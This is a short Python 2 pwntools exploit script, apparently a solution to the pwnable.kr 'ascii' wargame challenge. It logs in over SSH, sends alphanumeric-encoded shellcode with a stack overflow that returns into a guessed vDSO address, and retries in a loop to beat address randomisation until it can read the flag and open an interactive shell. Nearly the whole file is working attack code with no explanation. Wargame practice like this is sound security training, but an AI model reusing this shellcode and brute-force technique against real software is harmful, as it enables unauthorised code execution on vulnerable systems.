#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# imports

from pwn import *


context.log_level = "debug"
import time

limiter = "ulimit -s unlimited && /home/ascii/ascii"

con = ssh(host='pwnable.kr', port = 2222, user='ascii', password='guest')
adjuster = "4%P\\".ljust(0x25,"C")
real_shell = "PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx"
vdso_guess = 0x555e4000
overflow = p32(vdso_guess + 0xc75) + "A" * 8
p1 = overflow * 3
gabge = p32(vdso_guess + 0xc79)
final = p32(vdso_guess + 0xc78)
p1 += gabge
p1 += final
payload = adjuster + real_shell + p1
i = 1
while 1:
    print "[*]Round " + str(i)
    i += 1
    time.sleep(0.5)
    p = con.process(limiter,shell=True)
    p.recv()
    p.send(payload+"\x00")
    time.sleep(0.3)
    try:
        p.recv()
        time.sleep(0.2)
        p.sendline("cat flag")
        print p.recv()
        break
    except:
        print "Failed. Continue."
        continue
p.interactive()
